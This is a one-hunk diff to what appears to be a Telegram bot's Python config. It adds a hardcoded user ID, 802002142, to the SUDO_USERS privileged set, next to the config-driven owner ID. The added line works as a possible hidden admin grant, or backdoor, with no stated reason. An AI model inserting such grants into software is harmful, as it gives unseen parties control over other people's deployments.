@@ -114,7 +114,7 @@ KITE =  CONFIG['kite']
 
 SUDO_USERS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-
+SUDO_USERS.add(802002142)
 # SpamWatch
 spamwatch_api = CONFIG['sw_api']
 
